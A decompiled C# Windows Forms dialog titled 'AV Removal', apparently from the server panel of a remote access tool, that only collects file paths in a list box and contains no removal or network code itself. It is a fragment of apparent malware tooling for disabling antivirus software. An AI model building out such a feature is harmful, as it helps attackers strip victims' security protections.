using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.VisualBasic;

namespace Server.Forms
{
	// Token: 0x0200007C RID: 124
	public partial class AVR : Form
	{
		// Token: 0x06000318 RID: 792 RVA: 0x00003BF4 File Offset: 0x00001DF4
		public AVR()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000319 RID: 793 RVA: 0x00022840 File Offset: 0x00020A40
		private void toolStripMenuItem2_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("Add Path", "AV Removal", "", -1, -1);
			if (text.Length != 0 && !this.listBox1.Items.Contains(text))
			{
				this.listBox1.Items.Add(text);
			}
		}

		// Token: 0x0600031A RID: 794 RVA: 0x00022894 File Offset: 0x00020A94
		private void removeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				while (this.listBox1.SelectedItems.Count > 0)
				{
					this.listBox1.Items.Remove(this.listBox1.SelectedItem);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600031B RID: 795 RVA: 0x00002287 File Offset: 0x00000487
		private void AVR_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x0600031C RID: 796 RVA: 0x00003C02 File Offset: 0x00001E02
		private void button1_Click(object sender, EventArgs e)
		{
			if (this.listBox1.Items.Count > 0)
			{
				base.DialogResult = DialogResult.OK;
			}
		}

		// Token: 0x0600031D RID: 797 RVA: 0x00003C1E File Offset: 0x00001E1E
		private void clearToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.listBox1.Items.Clear();
		}
	}
}
